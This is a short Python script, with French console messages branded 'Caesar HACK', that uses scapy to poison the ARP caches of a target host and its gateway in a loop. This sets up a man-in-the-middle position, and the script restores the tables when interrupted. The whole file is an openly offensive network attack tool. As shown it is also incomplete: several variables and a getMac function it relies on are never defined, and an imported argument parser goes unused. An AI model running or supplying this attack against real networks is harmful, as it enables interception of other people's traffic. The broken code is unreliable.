
import scapy.all as scapy
import time
import argparse
import sys

def spoofer(targetIP, spoofIP):
    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=destinationMac,psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=sourceMAC)
    scapy.send(packet, count=4,verbose=False)


packets = 0
try:
    while True:
        spoofer(targetIP,gatewayIP)
        spoofer(gatewayIP,targetIP)
        print("\rCaesar HACK : [+] Envoie de paquets "+ str(packets)),
        sys.stdout.flush()
        packets +=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
    restore(targetIP,gatewayIP)
    restore(gatewayIP,targetIP)